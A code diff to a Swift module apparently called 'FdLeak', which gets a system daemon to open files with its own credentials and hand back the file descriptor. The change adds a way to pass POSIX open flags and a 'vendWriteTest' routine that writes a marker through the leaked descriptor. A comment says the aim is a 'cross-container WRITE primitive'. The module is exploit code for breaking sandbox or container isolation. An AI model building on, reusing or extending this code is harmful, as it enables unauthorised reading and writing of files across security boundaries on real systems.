@@ -261,10 +261,10 @@ enum FdLeak {
         }
 
         /// Ask the daemon to open `path` with its own credentials and hand back the fd.
-        func vend(_ path: String) -> Vend {
+        func vendEx(_ path: String, openOptions: UInt64) -> Vend {
             var result = Vend(ok: false)
             guard established else {
-                result.note = tl("握手未完成")
+                result.note = tl("handshake incomplete")
                 return result
             }
 
@@ -275,7 +275,7 @@ enum FdLeak {
                 return result
             }
             _ = b.setCFURL(m, "CreationURL", Unmanaged.passUnretained(url).toOpaque())
-            b.dictSetU64(OpaquePointer(m), "FileOpenOptions", 0)
+            b.dictSetU64(OpaquePointer(m), "FileOpenOptions", openOptions)
 
             let (reply, replyType) = send(m)
             b.release(OpaquePointer(m))
@@ -314,6 +314,26 @@ enum FdLeak {
             result.ok = true
             result.note = "fd=\(fd)"
             return result
+        }
+
+        func vend(_ path: String) -> Vend { return vendEx(path, openOptions: 0) }
+
+        /// WRITE PROBE (2026-11-07, the mode-byte question): same 'Curl'
+        /// message, FileOpenOptions = the POSIX open flags the daemon
+        /// passes through. If nonzero options yield a writable fd, this
+        /// module graduates to a cross-container WRITE primitive.
+        func vendWriteTest(_ path: String, options: UInt64) -> Vend {
+            var v = vendEx(path, openOptions: options)
+            guard v.ok, v.fd >= 0 else { return v }
+            let payload = Array("fdw-\(Int(Date().timeIntervalSince1970))".utf8)
+            let w = payload.withUnsafeBytes { raw -> Int in
+                write(v.fd, raw.baseAddress, raw.count)
+            }
+            v.note += " | opts=\(String(options, radix: 16)) write=\(w)"
+            v.ok = w > 0
+            if w > 0 { v.note += " <-- WRITE LANDED" }
+            Darwin.close(v.fd); v.fd = -1
+            return v
         }
 
         /// Read up to `limit` bytes through a vended fd. Descriptor I/O — no path check.
